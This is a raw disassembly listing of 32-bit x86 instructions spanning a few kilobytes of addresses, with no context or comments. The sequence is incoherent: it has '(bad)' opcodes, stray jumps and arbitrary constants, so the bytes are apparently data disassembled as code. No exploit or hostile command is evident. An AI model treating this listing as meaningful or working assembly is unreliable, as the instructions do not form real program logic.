  412eff:	and    dl,BYTE PTR [esi]
  412f01:	mov    al,ds:0x10600d64
  412f06:	and    DWORD PTR [edx+0x9c61502],0x8
  412f0d:	or     DWORD PTR [ecx-0x80],eax
  412f10:	adc    al,al
  412f12:	inc    eax
  412f13:	xor    BYTE PTR [eax-0x80],ch
  412f16:	add    BYTE PTR [ecx],al
  412f18:	mov    al,cl
  412f1a:	xor    DWORD PTR [eax],0x20622242
  412f20:	sub    DWORD PTR [ebx+0x50004088],edx
  412f26:	add    cl,BYTE PTR [ecx]
  412f28:	and    BYTE PTR [eax+0x25],ah
  412f2b:	and    BYTE PTR [edx+ebp*1],al
  412f2e:	or     al,0xb0
  412f30:	and    eax,0x32e05100
  412f35:	popa   
  412f36:	mov    al,ds:0x50a2000
  412f3b:	mov    BYTE PTR ds:0x100a288,ah
  412f41:	add    BYTE PTR [eax+0xd],ch
  412f44:	inc    eax
  412f45:	inc    edx
  412f46:	or     ch,BYTE PTR [edx]
  412f48:	add    DWORD PTR [ebx+0x0],esi
  412f4b:	add    DWORD PTR [edx+0x300a6080],ecx
  412f51:	add    bh,bh
  412f53:	adc    eax,0x421b80
  412f58:	pusha  
  412f59:	add    BYTE PTR [eax+0x12],bh
  412f5c:	dec    eax
  412f5d:	inc    edx
  412f5e:	add    al,0x8
  412f60:	sbb    BYTE PTR [eax+0x35123002],0x8
  412f67:	or     BYTE PTR [ecx+0x620045],dh
  412f6d:	inc    ecx
  412f6e:	add    DWORD PTR [eax+0x4],eax
  412f71:	sub    BYTE PTR [eax+0x40943052],al
  412f77:	add    eax,DWORD PTR [ecx+0x10]
  412f7a:	and    DWORD PTR [ecx+0x3],edx
  412f7d:	pusha  
  412f7e:	and    al,0x81
  412f80:	add    BYTE PTR [ecx+0x0],ah
  412f83:	popa   
  412f84:	xchg   edx,eax
  412f85:	add    cl,BYTE PTR [edi]
  412f87:	or     BYTE PTR [ecx+ecx*1],ch
  412f8a:	sbb    BYTE PTR [esi+ecx*1+0x0],dh
  412f8e:	add    BYTE PTR [eax],al
  412f90:	sbb    BYTE PTR [eax+0x8],al
  412f93:	and    dh,BYTE PTR [eax+0x44]
  412f96:	pop    eax
  412f97:	add    eax,DWORD PTR [eax+0x20]
  412f9a:	nop
  412f9b:	or     BYTE PTR ds:0x243a122,cl
  412fa1:	push   es
  412fa2:	loopne 0x412fad
  412fa4:	adc    cl,BYTE PTR [ecx+ebp*4+0x20567e10]
  412fab:	data16 mov WORD PTR [edx],fs
  412fae:	add    DWORD PTR [eax+0x29],eax
  412fb1:	add    al,0x1
  412fb3:	mov    BYTE PTR [esi],al
  412fb5:	or     BYTE PTR [eax+eax*4],al
  412fb8:	inc    eax
  412fb9:	add    bl,BYTE PTR [ebp-0x2ff79750]
  412fbf:	adc    al,BYTE PTR [eax]
  412fc1:	cdq    
  412fc2:	adc    al,0xac
  412fc4:	or     DWORD PTR [ebp+0x9820050],esi
  412fca:	and    BYTE PTR [edx],dl
  412fcc:	adc    BYTE PTR [ebp-0x7c],al
  412fcf:	xor    dl,BYTE PTR [esi]
  412fd1:	adc    BYTE PTR [ecx-0x3f],dl
  412fd4:	or     BYTE PTR [ebp-0x80],al
  412fd7:	loopne 0x412fdb
  412fd9:	pop    es
  412fda:	inc    eax
  412fdb:	push   es
  412fdc:	loopne 0x412f86
  412fde:	add    BYTE PTR [eax],cl
  412fe0:	add    al,0x85
  412fe2:	shl    BYTE PTR [eax+eax*4],1
  412fe5:	sbb    dl,bl
  412fe7:	add    al,0x5d
  412fe9:	dec    eax
  412fea:	and    BYTE PTR [ecx],0x8
  412fed:	and    BYTE PTR [eax+0x20],0x58
  412ff1:	adc    BYTE PTR [eax+eax*1],al
  412ff4:	inc    eax
  412ff5:	mov    eax,DWORD PTR [ecx-0x5b7fee28]
  412ffb:	or     DWORD PTR [ebx],0xa88c2007
  413001:	inc    eax
  413002:	or     BYTE PTR [edx],al
  413004:	inc    eax
  413005:	add    eax,ecx
  413007:	add    BYTE PTR [edx],al
  413009:	and    eax,0x40600480
  41300e:	and    DWORD PTR ds:0x1520000,ebp
  413014:	and    BYTE PTR [edx+0x41],dl
  413017:	cwde   
  413018:	add    dl,BYTE PTR [eax+0x19]
  41301b:	add    al,0x18
  41301d:	add    al,0x3
  41301f:	push   ss
  413020:	add    ecx,0xa28518a8
  413026:	fadd   DWORD PTR [eax]
  413028:	add    BYTE PTR [eax-0x34],bl
  41302b:	or     BYTE PTR [edx*8+0x2828088],0x0
  413033:	add    DWORD PTR [edx+0x10168c0],ebp
  413039:	or     al,0x41
  41303b:	inc    eax
  41303c:	mov    al,ds:0x554a0
  413041:	xchg   ebp,eax
  413042:	add    al,0x0
  413044:	stos   BYTE PTR es:[edi],al
  413045:	add    ah,BYTE PTR [edi+eax*4-0x7eb2dfcb]
  41304c:	and    BYTE PTR [eax],dh
  41304e:	ret    
  41304f:	pop    ds
  413050:	add    BYTE PTR [edx+0x79],al
  413053:	or     BYTE PTR [eax+0x2840014],ah
  413059:	adc    DWORD PTR [eax+0x34],eax
  41305c:	and    eax,0x720a58c
  413061:	inc    edi
  413062:	and    DWORD PTR [eax],eax
  413064:	add    DWORD PTR [eax+eax*4-0x80],esp
  413068:	cwde   
  413069:	mov    al,BYTE PTR [edi+0x10]
  41306c:	xor    BYTE PTR [ecx],al
  41306e:	call   0x854368db
  413073:	and    BYTE PTR [eax+0x48],cl
  413076:	adc    BYTE PTR [eax],al
  413078:	add    al,BYTE PTR ds:0x9c140001
  41307e:	add    eax,DWORD PTR [eax]
  413080:	add    al,BYTE PTR [eax]
  413082:	mov    WORD PTR [eax],es
  413084:	add    DWORD PTR [edx+eax*1],esp
  413087:	and    BYTE PTR [eax],ah
  413089:	or     BYTE PTR [edx+eiz*1],cl
  41308c:	push   es
  41308d:	add    al,0x38
  41308f:	xor    cl,BYTE PTR [esi+0x60400110]
  413095:	adc    BYTE PTR [edx],cl
  413097:	rcl    DWORD PTR [eax+eax*2],0x2
  41309b:	push   ss
  41309c:	and    BYTE PTR [eax+ecx*8-0x60],dh
  4130a0:	inc    edx
  4130a1:	and    BYTE PTR [eax+eax*4+0x687c043],al
  4130a8:	or     BYTE PTR [ecx+eax*1],0xa8
  4130ac:	int3   
  4130ad:	add    BYTE PTR [edx],al
  4130af:	mov    al,0x42
  4130b1:	and    BYTE PTR [edx],cl
  4130b3:	fsub   DWORD PTR [eax]
  4130b5:	add    BYTE PTR [eax],0x90
  4130b8:	adc    eax,eax
  4130ba:	inc    ecx
  4130bb:	add    al,0x15
  4130bd:	add    al,0x24
  4130bf:	rol    BYTE PTR [eax+0x2],0xa0
  4130c3:	xor    al,BYTE PTR [eax]
  4130c5:	push   eax
  4130c6:	stos   BYTE PTR es:[edi],al
  4130c7:	and    al,0x2
  4130c9:	or     al,bl
  4130cb:	xchg   esp,eax
  4130cc:	add    BYTE PTR [edx],al
  4130ce:	add    BYTE PTR [edx],ah
  4130d0:	add    al,0x0
  4130d2:	sbb    ch,BYTE PTR [eax]
  4130d4:	adc    al,0x32
  4130d6:	and    BYTE PTR [ecx],dl
  4130d8:	out    0xb4,al
  4130da:	xor    BYTE PTR [ecx],cl
  4130dc:	inc    eax
  4130dd:	lods   eax,DWORD PTR ds:[esi]
  4130de:	cmp    ah,dl
  4130e0:	xor    DWORD PTR [eax],eax
  4130e2:	or     al,0x2
  4130e4:	popf   
  4130e5:	and    BYTE PTR [eax+ecx*1+0x300ea0],al
  4130ec:	or     BYTE PTR [eax+0x5989a101],cl
  4130f2:	addr16 mov al,ds:0x88
  4130f6:	push   ss
  4130f7:	inc    ebx
  4130f8:	dec    edx
  4130f9:	adc    DWORD PTR [eax],0x80082e8a
  4130ff:	les    edx,FWORD PTR [eax-0x7e]
  413102:	push   eax
  413103:	adc    DWORD PTR [eax],eax
  413105:	mov    al,ds:0x40c09812
  41310a:	rol    DWORD PTR [eax-0x78],0x59
  41310e:	inc    edx
  41310f:	add    BYTE PTR [ecx],al
  413111:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413112:	sbb    DWORD PTR [eax],ebp
  413114:	pop    esp
  413115:	adc    al,0x40
  413117:	inc    eax
  413118:	sbb    BYTE PTR [eax+0x48088582],al
  41311e:	mov    dh,al
  413120:	push   es
  413121:	pop    esp
  413122:	and    eax,DWORD PTR [eax+0x211d0804]
  413128:	pop    es
  413129:	dec    esp
  41312a:	bound  esp,QWORD PTR [eax+0x8001060]
  413130:	or     eax,0x5008088
  413135:	or     BYTE PTR [esi],cl
  413137:	or     BYTE PTR [eax-0x4e],ah
  41313a:	or     BYTE PTR [eax+eax*4],0x11
  41313e:	cs add al,al
  413141:	sub    BYTE PTR [eax],0x48
  413144:	sub    DWORD PTR [eax],esp
  413146:	add    DWORD PTR [eax+0xa289ba2],ebp
  41314c:	inc    esp
  41314d:	and    eax,0x4c00401d
  413152:	dec    eax
  413153:	add    al,0x2a
  413155:	popa   
  413156:	add    BYTE PTR [eax+0x402],ch
  41315c:	add    BYTE PTR [ecx],0x20
  41315f:	xchg   esp,eax
  413160:	or     BYTE PTR [edx+0x4800080e],al
  413166:	add    BYTE PTR [eax+ebp*1+0x9],bl
  41316a:	ret    
  41316b:	or     ch,BYTE PTR [ebp+0x585c80]
  413171:	adc    al,0x88
  413173:	add    al,0x80
  413175:	inc    esp
  413176:	add    DWORD PTR [eax],edx
  413178:	adc    cl,BYTE PTR [edx]
  41317a:	inc    eax
  41317b:	add    BYTE PTR [eax],ch
  41317d:	inc    eax
  41317e:	xor    BYTE PTR [eax],al
  413180:	inc    eax
  413181:	and    al,cl
  413183:	add    BYTE PTR [eax+0x10],dl
  413186:	dec    eax
  413187:	add    al,0x4c
  413189:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41318a:	cmp    DWORD PTR [eax],eax
  41318c:	xchg   BYTE PTR [eax],al
  41318e:	sub    BYTE PTR [eax-0x71],ch
  413191:	add    al,0x26
  413193:	or     al,0x0
  413195:	and    DWORD PTR [edx],esp
  413197:	add    BYTE PTR [eax],al
  413199:	(bad)
  41319d:	adc    ah,BYTE PTR ds:0x493181a8
  4131a3:	(bad)  
  4131a4:	or     dh,al
  4131a6:	imul   eax,DWORD PTR [eax],0x8b408c2c
  4131ac:	or     BYTE PTR [esi],al
  4131ae:	nop
  4131af:	dec    eax
  4131b0:	or     al,0x84
  4131b2:	inc    eax
  4131b3:	sbb    DWORD PTR [eax+0x54030010],edx
  4131b9:	push   eax
  4131ba:	and    BYTE PTR [eax+eiz*4+0x2950005a],al
  4131c1:	mov    edx,0x8b8442c8
  4131c6:	inc    eax
  4131c7:	inc    esp
  4131c8:	mov    al,0x21
  4131ca:	adc    eax,DWORD PTR [ecx+0x84040]
  4131d0:	cmp    al,0x6c
  4131d2:	add    DWORD PTR [edx],eax
  4131d4:	add    al,BYTE PTR [ecx-0x80]
  4131d7:	mov    BYTE PTR [eax],al
  4131d9:	xor    esp,DWORD PTR [ebp+0x4]
  4131dc:	adc    BYTE PTR [eax+0x42906212],al
  4131e2:	xor    eax,0x20c08242
  4131e7:	dec    ecx
  4131e8:	xor    BYTE PTR [ebx],0x0
  4131eb:	inc    ebp
  4131ec:	push   cs
  4131ed:	inc    esp
  4131ee:	mov    cl,0x54
  4131f0:	and    BYTE PTR [eax+ecx*2],dl
  4131f3:	push   edx
  4131f4:	push   ecx
  4131f5:	dec    eax
  4131f6:	and    BYTE PTR [edx],dh
  4131f8:	mov    bl,BYTE PTR [eax-0x70]
  4131fb:	or     ah,BYTE PTR [ecx+edx*4]
  4131fe:	and    DWORD PTR [eax],eax
  413200:	or     al,BYTE PTR [eax+ecx*8+0x0]
  413204:	mov    BYTE PTR [eax+eax*1],dl
  413207:	xor    BYTE PTR [eax-0x6ee9ffd7],al
  41320d:	add    cl,BYTE PTR [edx+0x8]
  413210:	and    DWORD PTR [eax],eax
  413212:	bound  eax,QWORD PTR [eax]
  413214:	inc    ecx
  413215:	add    al,BYTE PTR [eax]
  413217:	ror    BYTE PTR [ecx],0x20
  41321a:	inc    esp
  41321b:	dec    eax
  41321c:	and    BYTE PTR [edx],dl
  41321e:	add    eax,0x40448011
  413223:	add    esp,DWORD PTR [ebx+0x2]
  413226:	add    al,0x0
  413228:	lds    eax,FWORD PTR [eax+0x926162]
  41322e:	mov    BYTE PTR [eax],cl
  413230:	and    BYTE PTR [edx],al
  413232:	mov    al,0xd0
  413234:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413235:	xchg   ecx,eax
  413236:	ret    
  413237:	mov    ds:0x1a48000f,al
  41323c:	mov    al,0x4
  41323e:	add    DWORD PTR [esi+0x0],ebx
  413241:	or     BYTE PTR [eax],al
  413243:	shl    DWORD PTR [eax],0x71
  413246:	and    BYTE PTR [eax+eax*4],ah
  413249:	add    BYTE PTR [eax],al
  41324b:	xchg   esp,eax
  41324c:	add    BYTE PTR [ecx],cl
  41324e:	and    DWORD PTR [esi],esi
  413250:	add    BYTE PTR [edx],0xa0
  413253:	xor    DWORD PTR [ecx],ecx
  413255:	adc    eax,0x30c00b
  41325a:	mov    ds:0xe11421b,al
  41325f:	dec    eax
  413260:	mov    WORD PTR [eax],gs
  413262:	sub    eax,eax
  413264:	bound  eax,QWORD PTR [ebx+eax*4+0x20413548]
  41326b:	test   BYTE PTR [ecx+0x50211002],ah
  413271:	sub    BYTE PTR [edx+eax*1],0x4
  413275:	rol    BYTE PTR [eax+eax*1],0x54
  413279:	xor    DWORD PTR [edx+0x8fc4285],esp
  41327f:	push   0xe2811064
  413284:	or     al,0x61
  413286:	inc    ebp
  413287:	add    DWORD PTR [eax],edx
  413289:	sub    DWORD PTR [esi],0x13
  41328c:	xchg   edx,eax
  41328d:	nop
  41328e:	sub    al,0x0
  413290:	test   DWORD PTR [eax+0x44402820],edx
  413296:	add    ah,BYTE PTR [eax]
  413298:	add    BYTE PTR [ecx],cl
  41329a:	add    DWORD PTR [eax],0x68c06cca
  4132a0:	adc    BYTE PTR [ecx],bl
  4132a2:	or     BYTE PTR [eax+eax*2],dl
  4132a5:	popa   
  4132a6:	inc    esp
  4132a7:	inc    edx
  4132a8:	pop    ebp
  4132a9:	inc    eax
  4132aa:	add    eax,DWORD PTR [esp+esi*1]
  4132ad:	add    eax,0x28010358
  4132b2:	lea    esp,[esi+eiz*1]
  4132b5:	xor    BYTE PTR ds:0x40a0c18,al
  4132bb:	mov    al,ds:0x2008901
  4132c0:	enter  0x40c2,0x10
  4132c4:	xchg   edx,eax
  4132c5:	or     dl,0x40
  4132c8:	or     BYTE PTR [ecx],0x41
  4132cb:	adc    eax,0x8841a400
  4132d0:	push   es
  4132d1:	add    BYTE PTR [ebx+0x9a00106],cl
  4132d7:	xor    DWORD PTR [edi+0x8],eax
  4132da:	add    BYTE PTR [eax],al
  4132dc:	call   0x81c516
  4132e1:	enter  0xb000,0x71
  4132e5:	xor    DWORD PTR [edx],esp
  4132e7:	or     DWORD PTR [eax],eax
  4132e9:	mov    al,ds:0x80654864
  4132ee:	enter  0x2828,0x18
  4132f2:	sbb    BYTE PTR [ebx],cl
  4132f4:	gs and al,0x40
  4132f7:	inc    eax
  4132f8:	add    BYTE PTR [ecx+0x68],dl
  4132fb:	sbb    BYTE PTR [eax],al
  4132fd:	dec    eax
  4132fe:	add    BYTE PTR [eax],al
  413300:	inc    esp
  413301:	adc    BYTE PTR [eax],al
  413303:	dec    esi
  413304:	dec    eax
  413305:	cdq    
  413306:	xor    BYTE PTR [eax+0x1b],bl
  413309:	adc    BYTE PTR [ecx+0x4],al
  41330c:	add    bh,al
  41330e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41330f:	(bad)  [eax]
  413311:	add    BYTE PTR [ebx],0xd0
  413314:	and    BYTE PTR [bp+si],al
  413317:	add    BYTE PTR [eax-0x5be97b80],al
  41331d:	add    DWORD PTR [eax],eax
  41331f:	xor    BYTE PTR [ecx],bl
  413321:	and    al,ch
  413323:	popa   
  413324:	sub    ebp,DWORD PTR [ebp-0x76fd57f0]
  41332a:	adc    ah,BYTE PTR [eax+eax*1+0x12]
  41332e:	add    al,BYTE PTR [ecx+0x1020cc03]
  413334:	add    BYTE PTR [ecx],al
  413336:	test   eax,0xd1811410
  41333b:	adc    dl,BYTE PTR [edx]
  41333d:	and    eax,esi
  41333f:	inc    eax
  413340:	shl    edx,0x18
  413343:	ins    DWORD PTR es:[edi],dx
  413344:	and    DWORD PTR [edx],eax
  413346:	push   0x1010808
  41334b:	adc    BYTE PTR [edx],al
  41334d:	and    DWORD PTR ds:0x2006522,eax
  413353:	adc    DWORD PTR [edx+0x72088260],esp
  413359:	xor    BYTE PTR [eax-0x5f7fb69e],dl
  41335f:	add    BYTE PTR [edx],ah
  413361:	or     BYTE PTR es:[eax+0x341239],cl
  413368:	dec    eax
  413369:	and    BYTE PTR [edx],ah
  41336b:	and    DWORD PTR [edi],ebx
  41336d:	daa    
  41336e:	add    BYTE PTR [ecx+0x20001c7e],bl
  413374:	mov    BYTE PTR [eax+0x14500220],al
  41337a:	add    al,0x49
  41337c:	loopne 0x4133a6
  41337e:	xor    ah,BYTE PTR [eax]
  413380:	and    BYTE PTR [eax],al
  413382:	inc    ebx
  413383:	add    DWORD PTR [edx+0x10],eax
  413386:	add    al,BYTE PTR [eax+0xb441120]
  41338c:	push   es
  41338d:	add    BYTE PTR [eax+0x14a62080],al
  413393:	add    BYTE PTR [eax],cl
  413395:	mov    DWORD PTR [eax],eax
  413397:	adc    DWORD PTR [eax-0x472fc677],esp
  41339d:	dec    eax
  41339e:	leave  
  41339f:	add    BYTE PTR [eax-0x70],cl
  4133a2:	and    BYTE PTR [eax],al
  4133a4:	dec    eax
  4133a5:	add    BYTE PTR [eax+0x4000c840],cl
  4133ab:	sbb    BYTE PTR [eax+0x21218d24],0x50
  4133b2:	and    BYTE PTR [esi-0x80],cl
  4133b5:	or     BYTE PTR [eax],al
  4133b7:	add    DWORD PTR [eax+0x2444a9c],esp
  4133bd:	dec    ecx
  4133be:	and    al,BYTE PTR [eax]
  4133c0:	or     BYTE PTR [eax+0x18225090],ah
  4133c6:	add    BYTE PTR [ebx-0x7f],0x89
  4133ca:	shl    BYTE PTR [esi],cl
  4133cc:	add    BYTE PTR [eax],0x20
  4133cf:	add    DWORD PTR [eax-0x5c],ecx
  4133d2:	and    BYTE PTR [esi+0x14380092],dl
  4133d8:	add    al,ah
  4133da:	add    BYTE PTR [eax+eax*1+0x4342098],cl
  4133e1:	xor    BYTE PTR [ebp+0x60],0x30
  4133e5:	add    BYTE PTR [eax],al
  4133e7:	xor    BYTE PTR [ecx],ah
  4133e9:	add    DWORD PTR [ecx+edx*4-0x7d7f777f],edx
  4133f0:	cmp    cl,BYTE PTR [eax]
  4133f2:	sub    eax,0xc090c0bd
  4133f8:	inc    eax
  4133f9:	add    al,cl
  4133fb:	add    BYTE PTR [eax+ebp*4+0x70],ah
  4133ff:	mov    ecx,0xa90801
  413404:	add    ah,cl
  413406:	add    BYTE PTR [edx-0x44d67a7a],al
  41340c:	push   edx
  41340d:	add    BYTE PTR [ecx],cl
  41340f:	cwde   
  413410:	add    BYTE PTR [edx],ah
  413412:	or     BYTE PTR [esi],dl
  413414:	mov    ds:0x18c04008,al
  413419:	push   cs
  41341a:	add    al,0x1
  41341c:	pop    ecx
  41341d:	sub    al,BYTE PTR [ecx]
  41341f:	pusha  
  413420:	nop
  413421:	mov    al,ds:0x230021dc
  413426:	add    al,0x0
  413428:	in     eax,0xc1
  41342a:	add    BYTE PTR [esi+0x4082410],0x81
  413431:	xchg   ecx,eax
  413432:	add    BYTE PTR [edx],al
  413434:	mov    ds:0x880820,al
  413439:	adc    esp,ebx
  41343b:	ins    DWORD PTR es:[edi],dx
  41343c:	xor    BYTE PTR [eax],al
  41343e:	sub    BYTE PTR [edx+ecx*1+0x10160834],dl
  413445:	ror    BYTE PTR [edx+0x4019],cl
  41344b:	and    DWORD PTR [eax+ecx*1],eax
  41344e:	add    al,BYTE PTR [edx+0x54]
  413451:	add    BYTE PTR [eax+0xa580650],dl
  413457:	or     al,0x33
  413459:	sbb    DWORD PTR [eax-0x7c],0x1db491
  413460:	or     BYTE PTR [eax+0x41],cl
  413463:	mov    ah,0x42
  413465:	adc    DWORD PTR [ecx],ecx
  413467:	clc    
  413468:	mov    dl,0x2
  41346a:	or     DWORD PTR [eax+edx*1],eax
  41346d:	and    ch,BYTE PTR [ecx+0x0]
  413470:	cdq    
  413471:	or     BYTE PTR ds:0x51408851,cl
  413477:	es pop esp
  413479:	lea    ebx,ds:0x26006002
  41347f:	les    edx,FWORD PTR [edx+0x40]
  413482:	push   0x0
  413484:	add    BYTE PTR [edx],al
  413486:	add    BYTE PTR [ebp+0x4120a4e0],0x48
  41348d:	add    BYTE PTR [eax-0x6e],al
  413490:	sub    BYTE PTR [eax],al
  413492:	je     0x4134b4
  413494:	sub    ah,BYTE PTR [ebx+0xa]
  413497:	adc    DWORD PTR [esp+eax*2+0x1],0x8000540
  41349f:	xor    BYTE PTR [edx+0x60a1070c],0x4
  4134a6:	add    BYTE PTR [eax+edx*1],0x91
  4134aa:	xor    BYTE PTR [edx+0x2704e000],al
  4134b0:	add    BYTE PTR [ecx],0xec
  4134b3:	adc    BYTE PTR [eax+0x40],al
  4134b6:	pusha  
  4134b7:	and    BYTE PTR [edx],al
  4134b9:	add    ah,BYTE PTR [edx]
  4134bb:	dec    eax
  4134bc:	or     BYTE PTR [eax],cl
  4134be:	cwde   
  4134bf:	add    al,BYTE PTR [edx]
  4134c1:	push   0x852306
  4134c6:	(bad)  
  4134c7:	adc    BYTE PTR [eax-0x7fde5fe0],al
  4134cd:	xor    al,0x6
  4134cf:	inc    eax
  4134d0:	and    BYTE PTR [edx-0x7c],0x4
  4134d4:	test   BYTE PTR [ecx+0x1100402],al
  4134da:	inc    ecx
  4134db:	push   edx
  4134dc:	add    BYTE PTR [eax],dl
  4134de:	xor    BYTE PTR [eax],al
  4134e0:	mov    ds:0xc0a8244d,al
  4134e5:	add    DWORD PTR [edx+eax*1+0x10],ecx
  4134e9:	inc    eax
  4134ea:	add    BYTE PTR [ecx-0x7b],0xa
  4134ee:	sbb    BYTE PTR [edx+0x60e03200],cl
  4134f4:	add    BYTE PTR ds:0x82b88801,al
  4134fa:	push   ss
  4134fb:	add    al,BYTE PTR [edx]
  4134fd:	add    al,0x4a
  4134ff:	and    BYTE PTR [eax],ah
  413501:	add    eax,DWORD PTR [eax+0x40]
  413504:	dec    edx
  413505:	xor    BYTE PTR [esp+eax*1],dh
  413508:	add    BYTE PTR [eax+0x4],bl
  41350b:	dec    eax
  41350c:	and    al,0x85
  41350e:	and    eax,DWORD PTR [edi+0x5111c]
  413514:	adc    al,BYTE PTR [edx]
  413516:	and    BYTE PTR [eax+0x2],cl
  413519:	xor    al,0x6
  41351b:	loopne 0x413529
  41351d:	aam    0xa1
  41351f:	nop
  413520:	dec    eax
  413521:	das    
  413522:	or     DWORD PTR [edx+eax*1+0x20390100],eax
  413529:	or     DWORD PTR [ecx],eax
  41352b:	add    DWORD PTR [eax],esp
  41352d:	ret    0x284
  413530:	retf   0x200e
  413533:	and    BYTE PTR [eax+0x60b07],al
  413539:	inc    eax
  41353a:	add    BYTE PTR [eax],al
  41353c:	push   cs
  41353d:	cmp    al,cl
  41353f:	or     al,BYTE PTR [ebx+0x442004e0]
  413545:	add    esp,DWORD PTR [edx]
  413547:	adc    BYTE PTR [eax],al
  413549:	and    BYTE PTR [edx+0x80390],dl
  41354f:	xchg   DWORD PTR [ecx-0x67f68dbe],eax
  413555:	add    BYTE PTR [eax-0x23fafbf9],al
  41355b:	inc    ecx
  41355c:	or     eax,edx
  41355e:	inc    edx
  41355f:	adc    BYTE PTR [esi+0x68],0x11
  413563:	or     DWORD PTR es:[ecx],0x4070078
  41356a:	mov    al,ds:0x151e12
  41356f:	loope  0x413522
  413571:	cs leave 
  413573:	rol    BYTE PTR [ecx],0x48
  413576:	rol    BYTE PTR [edx+eax*1],1
  413579:	or     BYTE PTR [eax],bl
  41357b:	inc    eax
  41357c:	test   al,0x8
  41357e:	mov    ds:0xa0940103,al
  413583:	sbb    BYTE PTR [eax],al
  413585:	inc    esp
  413586:	or     BYTE PTR [ecx],cl
  413588:	xor    al,0xa5
  41358a:	or     dh,BYTE PTR [edx+0x342062c1]
  413590:	or     al,al
  413592:	or     al,0x54
  413594:	add    BYTE PTR [eax],al
  413596:	pop    ecx
  413597:	add    BYTE PTR [eax],al
  413599:	pusha  
  41359a:	dec    ecx
  41359b:	add    al,BYTE PTR [edx+0x16]
  41359e:	add    BYTE PTR [eax],al
  4135a0:	jge    0x413530
  4135a2:	sub    eax,0x40d14710
  4135a7:	add    BYTE PTR [ecx],al
  4135a9:	mov    BYTE PTR [eax+0x1],al
  4135ac:	adc    bl,BYTE PTR [ecx]
  4135ae:	mov    BYTE PTR [ecx],al
  4135b0:	add    BYTE PTR [ecx-0x70],cl
  4135b3:	adc    cl,BYTE PTR [ecx]
  4135b5:	add    BYTE PTR [ebx+0x60],dh
  4135b8:	and    eax,0x22000482
  4135bd:	sbb    al,0x40
  4135bf:	add    DWORD PTR [ecx],edx
  4135c1:	jo     0x413588
  4135c3:	add    eax,0x10800
  4135c8:	add    al,0x84
  4135ca:	add    DWORD PTR [edx+0x29],edi
  4135cd:	add    BYTE PTR [edi+0x1],dl
  4135d0:	xor    dl,BYTE PTR [ecx]
  4135d2:	add    al,al
  4135d4:	adc    eax,0x23a03162
  4135d9:	or     BYTE PTR [eax-0x79f75efb],ah
  4135df:	mov    WORD PTR [ebp+0x250c4440],?
  4135e5:	add    BYTE PTR [ebx+0x5290194],0x0
  4135ec:	xchg   ecx,eax
  4135ed:	and    DWORD PTR [eax+0x201e4461],eax
  4135f3:	sbb    esp,eax
  4135f5:	or     BYTE PTR [ecx],ah
  4135f7:	add    BYTE PTR [eax+0x27d10212],al
  4135fd:	add    BYTE PTR [eax],al
  4135ff:	add    DWORD PTR [ecx+0x4],eax
  413602:	add    BYTE PTR [ecx+0x3524002],al
  413608:	adc    DWORD PTR [esi+0x43696800],eax
  41360e:	add    dh,cl
  413610:	and    BYTE PTR [esi],cl
  413612:	mov    bl,dl
  413614:	or     BYTE PTR [eax+0x4c],cl
  413617:	add    al,0x0
  413619:	add    DWORD PTR [ebx],eax
  41361b:	adc    BYTE PTR [eax],cl
  41361d:	push   eax
  41361e:	add    esp,DWORD PTR [eax-0x7ffffe80]
  413624:	or     BYTE PTR [ebx],0x8c
  413627:	mov    al,ds:0x280c0810
  41362c:	dec    eax
  41362d:	push   ecx
  41362e:	pop    ss
  41362f:	loope  0x413676
  413631:	push   esi
  413632:	enter  0x30c0,0x8a
  413636:	or     BYTE PTR [eax+0x9],0x2a
  41363a:	inc    ecx
  41363b:	add    BYTE PTR [ecx],al
  41363d:	sub    eax,0xa842245
  413642:	xor    BYTE PTR [eax-0x5dbeb7f6],ah
  413648:	bound  ebp,QWORD PTR [eax+0x14]
  41364b:	add    BYTE PTR [edx],cl
  41364d:	add    DWORD PTR [esi],eax
  41364f:	sub    BYTE PTR [eax+0x286091a8],ah
  413655:	xor    ch,BYTE PTR [ebx+ebx*1]
  413658:	xor    BYTE PTR [eax],al
  41365a:	xchg   edx,eax
  41365b:	adc    BYTE PTR [eax],cl
  41365d:	sub    eax,0x40000023
  413662:	add    BYTE PTR [eax],cl
  413664:	cdq    
  413665:	add    BYTE PTR [eax],ah
  413667:	inc    eax
  413668:	sub    al,0xc1
  41366a:	push   eax
  41366b:	add    BYTE PTR [eax],al
  41366d:	shl    DWORD PTR [esp+eax*1],0x61
  413671:	add    DWORD PTR [edi+eax*1-0x7e],eax
  413675:	or     BYTE PTR [edx+0x17044468],al
  41367b:	mov    dl,0x14
  41367d:	sbb    ah,BYTE PTR [edx]
  41367f:	add    dl,BYTE PTR [esi]
  413681:	sbb    dh,al
  413683:	add    al,BYTE PTR [eax]
  413685:	adc    al,BYTE PTR [edx]
  413687:	mov    DWORD PTR [ecx],eax
  413689:	nop
  41368a:	pusha  
  41368b:	push   esp
  41368c:	test   al,0x28
  41368e:	and    BYTE PTR [edx],al
  413690:	add    al,BYTE PTR [eax+0x20000412]
  413696:	adc    BYTE PTR [ecx],0x0
  413699:	mov    WORD PTR [edx],es
  41369b:	or     BYTE PTR [eax+eiz*1],al
  41369e:	and    eax,0x48010889
  4136a3:	mov    eax,ds:0x40710a21
  4136a8:	sbb    DWORD PTR [ecx-0x80],eax
  4136ab:	adc    DWORD PTR [eax+eax*1],eax
  4136ae:	add    BYTE PTR [ecx+eax*1],al
  4136b1:	or     DWORD PTR [eax],eax
  4136b3:	xor    BYTE PTR [eax],al
  4136b5:	rol    DWORD PTR [eax+0x3c020c01],0x81
  4136bc:	xor    al,0x0
  4136be:	test   BYTE PTR [eax+ecx*4],dl
  4136c1:	mov    al,ds:0x38000
  4136c6:	popf   
  4136c7:	popa   
  4136c8:	and    dl,BYTE PTR [eax+0x293ed880]
  4136ce:	sub    BYTE PTR [eax-0x5eefbfe0],bl
  4136d4:	add    DWORD PTR [eax-0x40],esp
  4136d7:	adc    al,0x31
  4136d9:	nop
  4136da:	or     BYTE PTR [eax+0x10],cl
  4136dd:	adc    BYTE PTR [edx],al
  4136df:	add    dl,BYTE PTR [eax+eax*4]
  4136e2:	push   eax
  4136e3:	mov    al,0x4
  4136e5:	inc    eax
  4136e6:	and    eax,0xc805048b
  4136eb:	and    DWORD PTR [eax],0x1c0a8000
  4136f1:	adc    BYTE PTR [eax],al
  4136f3:	test   BYTE PTR [edx+edx*1],al
  4136f6:	add    BYTE PTR [ecx],ch
  4136f8:	inc    ecx
  4136f9:	add    DWORD PTR [esi+0x0],edx
